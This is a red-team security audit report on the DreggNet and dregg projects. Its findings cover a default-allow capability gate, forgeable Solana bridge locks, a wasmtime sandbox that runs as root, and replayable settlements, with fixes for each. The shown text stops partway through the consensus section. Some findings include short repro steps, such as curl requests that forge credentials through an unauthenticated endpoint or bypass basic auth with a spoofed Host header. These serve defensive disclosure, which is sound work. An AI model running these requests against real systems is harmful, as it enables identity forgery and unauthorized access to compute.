# DreggNet + dregg — Adversarial Red-Team Findings

Pass date: **2026-06-29**. Scope: a genuine-adversary security review across
`/Users/ember/dev/breadstuffs` and `/Users/ember/dev/DreggNet`, run BEFORE wider
exposure now that there is real money ($DREGG / the bridge), agents, and keys on
a live network. Method: attack each surface, distinguish **"Lean proves X"** from
**"the running Rust enforces X,"** and report what is EXPLOITABLE (with a PoC /
repro where cheap) vs what genuinely HOLDS (with the evidence). Companion to the
prior `redteam/MULTINODE-BYZANTINE-FINDINGS.md` (finality/devnet-edge: F-DOS-1
CLOSED, 9/9 Byzantine invariants held) and `redteam/THREAT-MODEL-FUZZ.md`
(wire/codec/executor). This pass covers the higher-stakes surfaces those did not:
money, cap-authority, sandbox, gateway/web/auth, mesh, light-client/recovery,
wallet.

The criticals were re-verified against source by the lead before stamping (cites
spot-checked at HEAD). Findings are honest both ways: a blocked attack ("I tried
X, stopped by Y at file:line") is reported as a HOLDS with its evidence; no
finding is manufactured.

> Reachability nuance, read first. Several of the sharpest findings are **latent**:
> the vulnerable code is a library / not-yet-wired path on `main` today (the bridge
> crate has no running relayer or webhook server; the finalized light-client check
> is only called from demos/tests). They are reported by **what happens on the
> obvious deployment**, because they are the money/finality primitives a deployer
> is meant to use. Each such finding is tagged `(latent)`. The ones that are live
> on the default build are tagged `(live)`.

## Summary table (criticals first)

| ID | Surface | Finding | Severity | Live? |
|----|---------|---------|----------|-------|
| **CAP-1** | Cap / authority | Kernel gate had a **default-allow hole**: `determine_required_permissions` was an allow-list with `_ => {}`, so `SetProgram`/`CellDestroy`/`CellSeal`/`CellUnseal`/`MakeSovereign` mapped to NO permission → `Authorization::Unchecked` accepted → overwrite/destroy a victim cell holding only any non-`Impossible` cap to it (cap amplification) | **CRITICAL** | ✅ FIXED (exhaustive match — no `_ =>`; SetProgram/MakeSovereign → SetVerificationKey floor, CellSeal/Unseal/Destroy → SetPermissions floor; Lean-aligned; PoC now refused, owner-signed still passes) |
| **BR-2** | Bridge (money) | Solana "trustless" verifier is forgeable at 4 points; deepest: inclusion proof proves an account *exists* on Solana, never that funds were *escrowed to the bridge* → mint arbitrary $DREGG having locked nothing | **CRITICAL** | latent |
| **BR-3** | Bridge (money) | Conservation invariant is **vacuous** (`InsufficientLocked` is dead code: every mint credits both `currently_locked` and `live_supply` by the same amount); real conservation rests entirely on forgeable lock evidence (BR-2) | **CRITICAL** | latent |
| **SBX-1** | Sandbox | wasmtime provider default is **root**: empty cap slice from `exec` falls through to `CapabilitySet::default() = grant_all()` → preopen host `/` read-write + `inherit_network`; untrusted workload reads/writes whole host fs + all tenants | **CRITICAL** | live |
| **GW-4a** | Gateway / bot | Discord `POST /api/op` was **unauthenticated custodial signing as any user** (signer derived from `bot_secret` + request-body `user_id`, no ownership proof) and publicly proxied → forge credentials / squat names on arbitrary users' cells | **CRITICAL→HIGH** | ✅ FIXED (per-user op-token ownership gate; unproven `user_id` → 401) — *needs redeploy* |
| **LC-2** | Light-client | Finalized light client has **no trusted validator set**: leg-3 accepts any N signatures over an attacker-supplied `participant_count` → an equivocating prover finalizes a fork | HIGH (CRIT-by-design) | latent (demo/test only) |
| **F1** | Consensus | Federation Ed25519 QC verifier **does not dedup `voter_id`** → one committee key forges a full quorum cert / checkpoint / epoch transition | **HIGH** | ✅ FIXED (voter_id dedup; duplicate-vote QC rejected) |
| **LC-1** | Light-client | The wired web-surface `dregg://` content gate is **count-only, no crypto, no committee** (`has_quorum` = `len() >= threshold`, `threshold:0` passes) → malicious content server paints attacker bytes as "attested" | **HIGH** | live |
| **LEASE-1a** | Lease / metering | Public machine-create synthesizes a `funded:true` lease from the *attacker's requested guest size* → free compute on the public API | **CRITICAL** | live (stub) |
| **LEASE-3** | Settlement | Exactly-once `(lease,period)` is **in-memory only**; on-chain memo is not enforced → restart/2nd settler ⇒ duplicate real on-chain Transfers | **CRITICAL** | live |

| **NODE-2** | Recovery | **No anti-rollback / height monotonicity** on boot → swap an older internally-consistent snapshot ⇒ revert finalized spends/burns, resurrect consumed nullifiers | HIGH | live |
| **MESH-2** | Mesh | dregg node `:8420`/`:9420` published to `0.0.0.0` (docker bypasses host ufw) with an **unauthenticated read API** → full ledger/receipt dump; gossip port exposed | HIGH | live |
| **F2** | Consensus | Federation admission bonds are **self-asserted, unbacked** (`sign(owner‖amount)`, no escrow) → `Bond::post(sk, u64::MAX)` admits a free Sybil | HIGH | live (crate boundary) |
| **BR-1** | Bridge (money) | Unsound RAM mint APIs (`mint_against_lock`/`mint_against_payment`) still `pub`, dedup only per-process → two relayers double-mint one lock | HIGH | latent |
| **LEASE-1c/2** | Lease / metering | Settled meter total is self-reported by the backend (no `meter_units ≤ budget`); no atomic balance ⇒ same lease runs N times | HIGH | live |

| LC-5 | Light-client | `AttestedRoot::is_valid` returns true for any 48-byte ThresholdQC without BLS verify | MEDIUM | live |
| F3/F4/F5 | Consensus | Threshold-decrypt is trusted-dealer w/ key==ciphertext-key + non-CT MAC; no QC-vote-equivocation slashing atom; KZG/beacon constructors with transient toxic waste | MEDIUM | live (constructors) |

**Surfaces that HOLD (verified):** the bridge Stripe-webhook HMAC (real, constant-time, secret not hardcoded); the committed bridge double-mint nullifier path; cap-grant/bearer attenuation (3-axis) and signature/replay forgery; the aggregate IVC core + VK pin; BLS/DKG/VRF cryptography; the wallet's key-exfil and blind-sign defenses; the portal publish-cap attenuation; the discord key-vault, channel isolation, and `/admin` authz; the tailnet ACL shape. Evidence in each section.

## 3. Cap / authority (the core) — **CRITICAL CAP-1**

The single most serious finding of this pass, and a real Rust↔Lean divergence.

### Verdict table
| # | Attack | Verdict | Severity |
|---|--------|---------|----------|
| 1a | Amplify on the `GrantCapability` path (perms/mask/expiry) | **HOLDS** — 3-axis attenuation (`apply.rs:539,556,571`) | — |
| 1b | Amplify via bearer / introduce | **HOLDS** (`authorize.rs:1341,1360`; `apply.rs:1899,1912`) | — |
| 1c/3 | **Amplify a weak cap / bypass the gate via an unmapped state-mutating effect** | **EXPLOITABLE** | **CRITICAL** |
| 2 | Forge a signature / replay a token | **HOLDS** — `verify_strict` + fed/nonce/position binding (`authorize.rs:889-943`) | — |

### CAP-1 (CRITICAL) — default-allow hole for ~6 state-mutating effects — ✅ FIXED

> **STATUS: FIXED** (`turn/src/executor/authorize.rs::determine_required_permissions`).
> The trailing `_ => {}` is gone — the per-effect match is now **exhaustive (closed)**,
> so `rustc` forces every present and future `Effect` variant to make a deliberate

>
> The original analysis follows.

**Root.** The WHO/WHAT gate runs `verify_authorization` on every action before its
effects apply; the required-permission set is computed by
`determine_required_permissions` (`turn/src/executor/authorize.rs:2051`), which is
an **allow-list ending in a silent `_ => {}`** (verified at `authorize.rs:2122`).
Only `Transfer/Send`, `SetField`, `IncrementNonce`, `Grant/RevokeCapability`,
`SetPermissions`, `SetVerificationKey`, and `Refusal` are mapped. When the mapped
set is empty, the gate falls to the general `Access` permission
(`authorize.rs:230-243`), which for `default_user()`/`sovereign_default()` is
`AuthRequired::None`, and `None` is satisfied by `Authorization::Unchecked`
(`authorize.rs:692` → `Ok`; verified). `Unchecked` is a fully valid wire value
(serde `alias "None"`, `action.rs:243`).

**The unguarded effects** (mutate live victim state, absent from the map, no
internal authority check when `cell == action_target`):
- `Effect::SetProgram` — `apply.rs:877`. Cross-cell check is gated on
  `cell != action_target` (`apply.rs:887`, verified); equal ⇒ skipped, program
  (the cell's caveat/predicate guards) overwritten at `apply.rs:913` with no auth.
  Its doc-comment claims parity with `apply_set_verification_key` — **false**:
  `SetVerificationKey` *is* mapped, `SetProgram` is not.
- `Effect::CellDestroy` — `apply.rs:2513` (irreversible tombstone; `DeathCertificate`
  is unsigned attacker-filled structural data, `lifecycle.rs:160`).
- `Effect::CellSeal` / `CellUnseal` — `apply.rs:2448,2481` (freeze/unfreeze).
- `Effect::MakeSovereign` — `apply.rs:2122` (change hosting/accounting model).

(Properly self-authorizing, NOT vulnerable: `Mint` requires a mint-cap;
`ExerciseViaCapability` enforces the cap permission-level AND `allowed_effects`
facet on every inner effect at `apply.rs:1770-1818` — the proper check the direct
path lacks.)

**The amplification.** To act on a victim `X ≠ agent`, `execute_tree.rs:447-453`
requires `has_access_at` (`capability.rs:500`), which returns true for **any**
capability whose `permissions != Impossible` — it ignores the cap's permission
*level* and `allowed_effects` *facet*. So a receive-only / transfer-only / narrow
cap to `X` is sufficient to overwrite `X`'s program or destroy it. The lattice you
carefully attenuated is never consulted for these effects. (And on a path that
does not bind `turn.agent` to a signer — the node HTTP submit *does* bind it, but
that is an HTTP-layer defense, not an executor one — `turn.agent = X` skips the
cap gate entirely; the victim pays the fee.)

**PoC sketch (no key, weak cap):**
```
Turn { agent: ATTACKER, nonce, fee, call_forest: [ Action {
    target: VICTIM_X,                       // attacker holds any non-Impossible cap to X
    authorization: Authorization::Unchecked,
    effects: [ Effect::SetProgram { cell: VICTIM_X, program: attacker_program } ],
}]}
// determine_required_permissions = []  → Access(None) → Unchecked Ok → program overwritten
// swap SetProgram for CellDestroy{target:X, certificate:{cell_id:X,..}} to tombstone X
```

**Rust↔Lean divergence.** The verified kernel `stateStep`
(`Dregg2.Exec.EffectsState.lean:208`, cited in these very handlers) gates these
writes on the *authority* leg; the Rust comments mirror only the kernel's
*liveness* leg (`is_live()`) for these effects. The `apply_set_program` comment
even admits "no descriptor rung binds this write … VK-affecting (ember-gated)."
The Lean non-amplification proof holds for the *modeled* effects; the Rust gate's
allow-list silently drops these variants — exactly the dangerous
direction `rejection_parity.rs` is meant to catch.

**Fix.** Make `determine_required_permissions` an **exhaustive (closed) match**
with no catch-all, mapping every state-mutating variant to its authority floor
(`SetProgram`/`MakeSovereign` → `SetVerificationKey`; `CellSeal`/`CellUnseal`/
`CellDestroy` → `SetPermissions` or a dedicated `Lifecycle` permission).
Additionally enforce the held cap's permission-level + `allowed_effects` facet on
the direct path the way `ExerciseViaCapability` already does, so a narrow cap
cannot be amplified. A future effect variant must then fail-closed by construction
(exhaustive match ⇒ compile error forces a deliberate mapping).

### HOLDS (verified)
Lattice `is_narrower_or_equal` sound (`permissions.rs:52`); grant attenuation on
all 3 axes (`apply.rs:539,556,571`); bearer/introduce enforce narrowing + facet +
expiry (`authorize.rs:1341,1360`); signature forgery & replay closed —
`verify_strict` with `federation_id + turn_nonce + position` bound into the message
(`authorize.rs:889-943`), `OneOf` cannot reduce to `Unchecked`, `CapTpDelivered`
has a non-amplification floor. The forgery surface is closed; the hole is that for
~6 effects **you do not need to forge anything** — the gate asks for nothing.

---

## 1. Bridge (money) — **CRITICAL BR-2, BR-3**

**Scope note:** `dregg-bridge` is library-only on `main` — no relayer daemon, no
webhook server, no binary wires a mint/verify API (every caller lives in doctests
/ `bridge/tests`). All bridge findings are therefore `(latent)`: they bite the
moment the obvious API is deployed.

### Verdict table
| # | Attack | Verdict | Severity |
|---|--------|---------|----------|
| 1 | Double-mint / bypass `lock_id` nullifier | Committed path **HOLDS**; RAM path EXPLOITABLE-if-deployed | HIGH |
| 2 | Forge a Solana lock | **EXPLOITABLE** — 4 independent breaks, incl. one defeating the "fully trustless" path | CRITICAL |
| 3 | Break conservation (mint from air) | Arithmetic HOLDS; backing-binding EXPLOITABLE (= #2); invariant vacuous | CRITICAL |
| 4 | Forge a Stripe webhook | **HOLDS** — real constant-time HMAC, secret not hardcoded | LOW |

### BR-2 (CRITICAL) — forge a Solana lock
The deployed-today leg is a **single Ed25519 oracle key** (not the threshold the
"federation" language implies): `FederationAttestation::verify` (`midnight.rs:75-108`)
is correct, so you cannot forge without that key — but whoever holds it mints at
will. The "trustless upgrade" (`solana_trustless.rs`) is forgeable at four points:
- **BR-2-D:** `mint_against_lock_proof` (`solana_trustless.rs:805-822`) credits
  after only `verify_lock_proof` — a self-consistency + `voted*3 >= total*2` check
  over **attacker-supplied scalars**, no sigs/stake/root. Returns `StructureOnly`,
  but **state already mutated** before the advisory flag is visible.
- **BR-2-B (deepest):** `verify_inclusion` (`:759-795`) hashes attacker-chosen
  `owner`/`vault_account` into the leaf but never checks `owner` is the bridge
  lock-program or `vault_account` is a canonical bridge PDA. `MirrorConfig` has no
  vault/program field. A "lock" is a 72-byte self-asserting blob
  (`lock_id‖recipient‖amount_le`). Attack: put that blob in any ~0.001-SOL account
  on real Solana → it lands in a genuine 2/3-signed finalized accounts hash → mint
  arbitrary $DREGG having escrowed nothing. **Defeats even the anchored path.**
- **BR-2-A:** legacy `verify_supermajority`/`tally_votes` counts a vote on
  `witness_binds` `(vote_account, slot, bank_hash)` without checking the signer is
  the on-chain authorized voter → attacker signs all big vote accounts with own key.
- **BR-2-C:** the stake table and weak-subjectivity anchor are **per-call args**
  (`:442,569,864`), not pinned in `MirrorConfig` — supply your own 100%-stake table.

**Genuinely sound:** `LockProofTrust` is output-only; tally math correct
(`solana_consensus.rs:332-388`); bank-hash⇄accounts-hash⇄inclusion chain closed;
vote-tx Ed25519 parsing real; the anchored provenance is sound on stake/voter axes
*given a real anchor*. **Fixes:** route every value-bearing mint through the
authorized-voter-bound tally; bind inclusion to a bridge-owned escrow
(`owner == lock_program_id`, `vault_account == pinned PDA`, real SPL layout); pin
the anchor as a governance constant; gate minting on `ConsensusVerified` only.

### BR-3 (CRITICAL) — conservation is vacuous
All arithmetic is `u64`+`checked_add` (HOLDS), but the committed conservation check
is dead: `bridge_mint_against_lock` credits *both* `currently_locked` and
`live_supply` by the same `amount` (`bridge_ledger.rs:211-217`), so
`new_live > new_locked ⟺ live > locked` — `InsufficientLocked` can never fire (same
in `solana_mirror.rs:465`, `stripe_mirror.rs:559`). `currently_locked` is
decorative; security rests entirely on lock-evidence validity (forgeable, BR-2) +
nullifier uniqueness. **Fix:** establish `currently_locked` from an *independent*
verified-lock source; bind `(nullifier, recipient, amount)` in-circuit via the
existing-but-unwired `action_binding`/`bridge_action_air`.

### BR-1 (HIGH) — RAM-path double-mint
The committed path is sound (atomic contains-then-insert on `note_nullifiers`,
projected to committed state `umem.rs:520-522,2247-2249`; two-relayer race blocked,
`committed_double_mint.rs`). But `MirrorState::mint_against_lock` /
`StripeMirrorState::mint_against_payment` dedup only per-process `BTreeSet`s and
remain `pub` and ergonomic → two relayer processes double-mint one lock.
**Fix:** make the RAM mint methods `pub(crate)`/deprecated; expose only
`verify_*` + `bridge_mint_against_lock`.

### HOLDS — Stripe webhook (BR-4)
Signed payload `"{t}.{body}"`, recomputed HMAC-SHA256 compared **constant-time**
(`subtle::ConstantTimeEq`) against every `v1` (`stripe_mirror.rs:253-291`); secret
is config, not hardcoded; tamper breaks it (`forged_signature_is_refused`).
Idempotency dedups on `payment_intent_id`. **Footguns (LOW):** replay-window check
is skipped when `now=None` (every example passes `None` — disables freshness, but
the nullifier still stops replay); `charge.succeeded` uses `amount` not
`amount_captured` (partial-capture over-mint).

---

## 4. Sandbox escape — **CRITICAL SBX-1**

### Verdict table
| Provider / surface | Escape cap-bounds | Reach host | Cross-tenant | Cap-threading |
|---|---|---|---|---|
| **wasmtime (exec path)** | **CRITICAL** root default → preopen `/` RW | **CRITICAL** whole-host fs+net | **CRITICAL** root fs sees all tenants | **CRITICAL** `&[]` caps ignored |
| wasmtime (explicit `host=` caps) | HOLDS | HOLDS | MED (request-ctx heap residue) | HOLDS |
| **native-provider** (in-proc dlopen) | **CRITICAL** | **CRITICAL** shared address space | **CRITICAL** | HIGH |
| native-process-provider ("Caged") | HOLDS (macOS refuses); HIGH Linux landlock fail-open | HOLDS (`env_clear`+seccomp/landlock pre_exec) | HOLDS | HOLDS |
| firecracker | HOLDS (KVM; net never configured) | HIGH (no jailer; ctrl socket in `/tmp`) | HOLDS (ro shared rootfs) | MED |
| wasmi ("Sandboxed") | HOLDS (host imports no-op) | HOLDS | HOLDS (fresh store) | N/A (DoS: no fuel/mem limit) |
| container | HOLDS (cap_drop ALL, ro-rootfs, net=none) | HOLDS | HOLDS | LOW (cap xlate dead/over-restrictive) |

### SBX-1 (CRITICAL) — wasmtime exec path runs every workload as ROOT
Full chain verified by the reviewer (lead confirmed `add_to_linker_sync` links the
full WASI P2 fs+sockets world unconditionally):
1. `exec/src/lib.rs:508-509` — `instantiate_with_caps(&component, &[], TENANT)`.
2. `polyana/.../core/src/provider.rs:666-674` — `WasmtimeProvider` does NOT
   override `instantiate_with_caps`; the trait default **discards** caps+tenant and
   calls `instantiate(component)`.
3. `.../wasmtime/src/provider.rs:399-401,191` — `instantiate()` reads
   `self.default_caps`, init'd to `CapabilitySet::default()`.
4. `.../core/src/capability.rs:639-647` — `Default for CapabilitySet` =
   `grant_all()` → **root** (every effect, `ResourcePattern::Any`).
5. `.../wasmtime/src/lib.rs:931-950,1027-1028` — root `Filesystem/Any` → preopen
   host `/` with `DirPerms::all()/FilePerms::all()`; root `Network/Any` →
   `inherit_network()`.
6. `.../wasmtime/src/lib.rs:643` — `wasmtime_wasi::p2::add_to_linker_sync` binds
   real host-backed fs+socket impls into every store.

Net: an untrusted component run through `exec` reads/writes anywhere under `/`
(`/etc/shadow`, SSH keys, every other tenant's data) and opens arbitrary sockets.
Compounded by a single static `TENANT = "dreggnet-exec"` (`exec/src/lib.rs:900`)
— no per-tenant partition. **Fix:** `WasmtimeProvider` must override
`instantiate_with_caps` to build the set from the passed slice (empty ⇒ deny);
provider default must be `CapabilitySet::new()` (empty), never `default()`; `exec`
must refuse rather than pass `&[]` while claiming enforcement.

### SBX-2 (CRITICAL) — `fs_preopen_from_cap` fails *open*
Independent of SBX-1: `Filesystem/Read` with no `host=` → preopen `/` (read);
`Filesystem/Any` → `/` RW (the production global `presets::agent()` is
`Filesystem/Any`, `runtime/src/lib.rs:713`). `enforce.rs:107-110` also
default-*allows* every `wasi:*` import despite a "default deny" comment.
**Fix:** make `fs_preopen_from_cap` fallible; require an explicit canonicalized
`host=` under an operator-set sandbox root; default perms `Read`; remove the `/`
and `/tmp` fallbacks.

### SBX-3 (CRITICAL) — `native-provider` is not an isolation boundary
Compiles guest wasm and `dlopen`s it **in the provider's own process** — no memory
isolation, all tenants one heap; on macOS seccomp is off and `cage-primitives` is
Linux-only and **does not refuse**, reporting `OsSandbox` while running guest
native code with full ambient authority. (`exec`'s "Caged" tier correctly routes to
`native-process-provider`, but `native-provider` is reachable via runtime
selection.) **Fix:** refuse on non-Linux like its sibling; don't advertise it as
an isolation level.

### HOLDS (verified)
wasmtime **network** is correctly cap-gated when caps are real (`Deny` default,
loopback `socket_addr_check`); **wasmi** host imports are no-op stubs, fresh store
per instance (DoS-only: no fuel/mem cap); **container** hardened by default
(`cap_drop:ALL`, ro-rootfs, `no-new-privileges`, `net=none`, exact mount match, no
docker-sock/privileged); **firecracker** keeps kernel/rootfs/boot-args
operator-fixed, ro shared rootfs (residual: no jailer, control socket in
world-writable `/tmp`); **native-process-provider** does it right (`env_clear`,
seccomp+landlock in `pre_exec`, refuses on macOS; residual Linux: landlock status
discarded → fail-open, `execve`+unaddressed `connect`/`socket` allowed).

## 5. Gateway / web / auth — **CRITICAL GW-4a**

### Verdict table
| # | Attack | Verdict | Severity |
|---|--------|---------|----------|
| 1 | Bypass Caddy basic-auth → gateway API | **EXPLOITABLE** (Host/SNI confusion) | HIGH |
| 1b | Crack committed basic-auth creds | EXPLOITABLE (conditional) | MED |
| 2 | Unauth machine create/delete/list | **EXPLOITABLE** | HIGH |
| 3a | Portal: publish to another tenant's namespace | **HOLDS** (cap-gated) | — |
| 3b | Portal: traversal / stored XSS | **HOLDS** (in-memory map, no fs, no dynamic innerHTML) | — |
| 4a | Discord `/api/op` custodial-as-any-user | ✅ FIXED (ownership-proof gate) | CRITICAL→HIGH |
| 4b | Discord BYO-LLM key exfil | **HOLDS** (sealed XChaCha20, redacted, fixed endpoints) | — |
| 4c | Discord channel isolation | **HOLDS** (by design) | — |
| 4d | Discord `/admin` authz | **HOLDS** (constant-time token, 404/401) | — |

### GW-4a (CRITICAL→HIGH) — Discord `/api/op` unauthenticated custodial signing — ✅ FIXED
**Fixed** (`discord-bot/src/http_server.rs`, `discord-bot/src/cipherclerk.rs`):
`drive_op` now calls `authorize_op` *before* any turn is built/signed. The caller
must present an ownership proof for the *exact* `user_id` in the body, as
`Authorization: Bearer <token>`: either the **per-user op token**
(`cipherclerk::op_token(bot_secret, user_id)` = `blake3::derive_key`-keyed by the
bot secret, domain-separated from the signing seed so it is NOT the Ed25519 key —
the capability the bot hands a Discord-authenticated user) **or** the operator
`ADMIN_TOKEN` (master override; the operator already holds the bot secret).
Constant-time compare; a missing/wrong token, or a token bound to a *different*
user, is `401`. The gate is always on (the per-user token is always derivable,
so the endpoint is never an open custodial-signing surface even without
`ADMIN_TOKEN`). The legit in-bot flow is unaffected: the desktop drives the bot
**on-chain** (the command cell the reactor watches → `deos_drive::drive`
in-process), never through this HTTP POST. Tests (`http_server::tests`):
`op_refused_without_ownership_proof`, `op_refused_with_wrong_users_token`,
`op_refused_with_garbage_token`, `op_authorized_with_per_user_token_passes_the_gate`,
`op_authorized_with_operator_token`, `op_token_is_per_user_and_deterministic`.
**Residual (defence-in-depth, gateway/deploy lane — not this fix):** scope the
Caddy `/api/*` matcher to the read endpoints so `/api/op` is not proxied publicly
at all. The bot is **live on the edge** → this fix needs a redeploy to take effect.

#### Original finding (for the record)
`POST /api/op` was registered with **no auth** (`discord-bot/src/http_server.rs:264`;
only `/admin` is gated). `deos_drive::drive` (`deos_drive.rs:357-365`) derives the
signing cipherclerk from `bot_secret` + **`req.user_id` from the request body** —
no proof the caller owns that user_id. Any caller signs+submits a real on-chain
turn as any Discord user: `RegisterName` (squat/grief a victim's registry),
`IssueCredential` with attacker-chosen `schema`/`attributes` (forge
`kyc`/`gov_id`/`employment`). Publicly exposed: `Caddyfile:67-69` proxies
`/api/*` on `portal.dregg.studio` (comment claims "public, read-only" — but
`/api/op` is a custodial POST under that prefix), plus `CorsLayer::permissive()`.
```
curl -X POST https://portal.dregg.studio/api/op -H 'content-type: application/json' \
  -d '{"user_id":<victim>,"op":"issue_credential","schema":"gov_id","attributes":{...}}'
```
**Fix:** require auth proving the caller controls `user_id` (or remove the HTTP
custodial path — the code already calls it "RELEGATED"); never proxy `/api/op`
publicly; scope the Caddy `/api/*` matcher to the real read endpoints.

### GW-1 (HIGH) — Caddy basic-auth bypass via Host/SNI
The gateway has **zero app-layer auth**; all auth is delegated to Caddy. The
`*.dregg.works` block reverse-proxies straight to `gateway:8080` with no auth
(`Caddyfile:43-49`). `www.dregg.works` → `site_name_from_host` returns `None`
(`webapp/src/hosting.rs:383`), so it is **not** treated as a static site and falls
through to the fly-machines route table; `default_sni localhost` lets the TLS
handshake succeed by raw IP. `curl -k https://<ip>/v1/apps/demo/machines -H 'Host:
www.dregg.works' -X POST -d '{}'` reaches the machines API past the basic-auth
that protects the operator surface. **Fix:** enforce app-layer auth in the
gateway; make the `*.dregg.works` block serve only the site handler; never let
`www`/non-site hosts reach the machines API.

### GW-2 (HIGH) — unauthenticated machine create/delete/list
`MachinesHandler::dispatch` (`gateway/src/http.rs:92-261`) does **no** auth on any
route; create's only gate is the synthetic lease (always funded, see LEASE-1a).
With `DREGGNET_DISPATCH=tailscale` each unauth create dispatches a real metered
workload to persvati (unauth remote compute + DoS); list enumerates any app's
machines; delete destroys any machine by id with no owner check. **Fix:**
authenticated app-scoped capability on every `/v1/apps/{app}/…` route; bind the
lessee to the authenticated principal, not the URL segment.

### Lesser
- **GW-1b (MED):** `simbi`/`dregg-admin` bcrypt hashes committed in `Caddyfile`
  (cost-14; offline-crackable if weak; rotate + move to secret mount).
- **Ops dashboard (INFO):** app-layer auth is **off by default** (`OPS_ADMIN_TOKEN`
  unset → `config.rs:32,110`); the whole-cloud snapshot + arbitrary `docker logs`
  rely solely on the single committed `dregg-admin` Caddy credential. Set
  `OPS_ADMIN_TOKEN` so defense-in-depth is actually on.

### HOLDS (verified)
Portal publish is cap-gated (`SiteRegistry::publish` checks `cap.authorizes(name)`,
`webapp/src/hosting.rs:312-339`) and has no network publish endpoint (boot-only,
operator-minted cap) → no cross-tenant overwrite; serving is in-memory map lookup
with `normalize_key` → no traversal; portal UI's only `innerHTML` sink is never
called with dynamic data. Discord key-vault seals each BYO key with
XChaCha20-Poly1305 (per-user blake3-keyed, AAD-bound), redacts on Debug, zeroizes,
fixed `&'static str` endpoints (no SSRF), no key logging. Channel isolation is
best-effort by Discord permissions (intentional admin visibility). `/admin` uses a
length-checked constant-time token (404 unconfigured / 401).

## 2. Lease / metering / settlement — **CRITICAL LEASE-1a, LEASE-3**

### Verdict table
| # | Attack | Verdict | Severity |
|---|--------|---------|----------|
| 1a | Free compute via public create (no funding check) | **EXPLOITABLE** (documented stub, live surface) | CRITICAL |
| 1b | Evade meter: wasmi steps unmetered; charge per-step not per-resource | **EXPLOITABLE** | HIGH |
| 1c | Meter self-reported by backend; no `meter_units ≤ budget` | **EXPLOITABLE** | HIGH |
| 1d | TOCTOU: work runs then settles; settle-fail ⇒ compute consumed | **EXPLOITABLE** | HIGH |
| 2 | Double-spend a lease across backends (no atomic decrement) | **EXPLOITABLE** | HIGH |
| 3 | Replay a settlement (exactly-once in-memory only) | **EXPLOITABLE** | CRITICAL |
| 4a | Negative/non-positive/unfunded amounts | **HOLDS** | — |
| 4b | Budget-gate i64 overflow | EXPLOITABLE (marginal) | LOW-MED |

### LEASE-1a (CRITICAL) — free compute on the public create API
`lease_for_create` (`gateway/src/lease.rs:65-71`) builds a `Lease::funded(...)`
with `budget_units` derived from the **attacker's requested guest size**
(`synthetic_budget`, `memory_mb/64`), `funded:true` unconditionally
(`bridge/src/lib.rs:174-189`); the bridge validation gate only checks the bool +
shape, never funding. `POST /v1/apps/x/machines {"config":{"guest":{...
"memory_mb":1048576}}}` → ~16384-period funded lease, zero payment. (Openly
labelled `TODO(real-lease)`, but it is the live public surface.) **Fix:**
`lease_for_create` must read the referenced funded lease cell via the verified
light-client read (`VerifiedNodeLeaseSource`/`dregg_verify`) and reject if the
on-chain reserve doesn't cover the request — never synthesize `funded:true`.

### LEASE-3 (CRITICAL) — replay a settlement
Dedup key `(lease_id, period)` is persisted **nowhere durable** — both backends
keep it in an in-memory `Mutex<HashMap>` (`durable/src/settle.rs:196-199`;
`control/src/node_api.rs:572`). The on-chain memo `dreggnet-settle:<lease>:<period>`
is only "auditable" — `submit_transfer` POSTs a plain `Effect::Transfer`
(`node_api.rs:223-248`) and **nothing checks for a prior transfer with that memo**.
Restart the settler (or run a second instance) → `settled` is empty → re-settle
every `(lease,period)` → **duplicate real on-chain Transfers**, double-charging the
lessee. (The pg meter outbox is idempotent, but `settle_meter_outbox` feeds it into
the in-memory sink, so settlement is still replayable across restart.) **Fix:**
persist the dedup (unique constraint in the meter DB) and/or enforce memo-uniqueness
in the kernel so a replayed settlement turn is rejected, not just "auditable."

### LEASE-1b/1c/1d/2 (HIGH)
- **1b:** charge is fixed `cost_per_step` (`durable/src/lib.rs:595-612`), decoupled
  from real consumption; wasmi has no fuel meter (`exec/src/lib.rs:398-402`) → one
  metered unit buys a full wall-clock budget of unbounded CPU.
- **1c:** `DurableOutput.meter_units` is parsed straight from the backend's HTTP
  JSON with no verification (`control/src/mesh.rs:663-669`) and settled verbatim
  (`orchestrator.rs:408-443`); **no `meter_units ≤ budget` check** → a compromised
  or on-path backend (plaintext HTTP) sets the bill arbitrarily.
- **1d:** `process_lease` runs the workload then settles (`orchestrator.rs:334-343`);
  settle-fail ⇒ `SettleFailed` but compute already ran. No "reserve before run."
- **2:** the meter is per-workflow-instance (`durable/src/lib.rs:255-260`), instance
  id is stable per lease cell (`node_api.rs:458`), dedup is process-local
  (`node_api.rs:357`); two orchestrators / a restart each run a full budget for one
  funded lease → compute delivered N times.
**Fix:** single authoritative balance with atomic reserve→decrement before
dispatch; control plane independently bounds/recomputes the charge (`min(reported,
budget)`), ultimately from a signed/attested receipt; global/persistent instance
dedup.

### HOLDS / lesser
Non-positive/unfunded/negative-budget rejected (`settle.rs:235`,
`bridge/src/lib.rs:193-194,266-277`); same-key-different-terms is a `Conflict` not
overwrite; `InsufficientFunds` guards the in-process ledger. **LEASE-4b (LOW-MED):**
`total + cost_per_step` and `steps * per` use unchecked i64 over attacker-influenced
lease fields (`durable/src/lib.rs:595`, `orchestrator.rs:416`) → wrap-to-unbilled
(release) / panic (debug). **Honest caveat:** 1a/1c and the node-API trust in 2/3
partly reflect the deliberately-stubbed "real funded lease" wire that's off by
default; they collapse once the verified on-chain lease read + kernel-enforced
settlement idempotency are wired (the code names this as next).

## 7. Light-client / consensus — **HIGH F1, LC-1, LC-2**

### Verdict table
| # | Goal | Verdict | Severity |
|---|---|---|---|
| 1 | Fool the light client | EXPLOITABLE on wired consumers; HOLDS for VK/aggregate core | HIGH |
| 1a | VK substitution | **HOLDS** (`lightclient/src/lib.rs:186-201`, `VkFingerprintMismatch`) | — |
| 1b | Forge/drop/reorder a turn in the aggregate | **HOLDS** (3 tamper teeth) | — |
| 2 | Forge finality / equivocate | **EXPLOITABLE** (F1, LC-2, F2) | HIGH |
| 2a | BLS rogue-key / DKG / VRF | **HOLDS** | — |
| 3 | Corrupt store on recovery | **EXPLOITABLE** (NODE-1 tamper, NODE-2 rollback) | HIGH |
| 3a | Recovery order soundness | **HOLDS** (`node/src/main.rs:1496-1513`) | — |
| 4 | Weaponize Rust↔Lean divergence | **EXPLOITABLE** (F1 is exactly a Lean-assumption the Rust violates) | HIGH |

### F1 (✅ FIXED) — duplicate-vote quorum forgery
**Fixed:** both `is_valid_with_keys` and `verify_with_keys`
(`federation/src/types.rs`) now track a `HashSet<usize>` of voter ids and
reject the QC the moment a `voter_id` repeats, so only DISTINCT valid voters
count toward the threshold. Tests in `types.rs::qc_dedup_tests`:
